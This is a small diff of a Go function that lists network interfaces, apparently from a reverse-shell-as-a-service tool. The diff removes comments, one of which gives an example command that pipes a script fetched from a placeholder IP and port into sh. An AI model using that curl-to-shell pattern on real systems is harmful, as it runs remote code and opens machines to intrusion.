@@ -9,10 +9,7 @@ import (
 
 // GatherInterfacesList returns a list of interfaces
 func GatherInterfacesList(host string) []string {
-	// Gather interface info
 	var interfaces []string
-	// Add help information of RaaS
-	// eg: curl http://[IP]:[PORT]/ | sh
 	if net.ParseIP(host).IsUnspecified() {
 		// tcpServer.Host is unspecified
 		// eg: "0.0.0.0", "[::]"
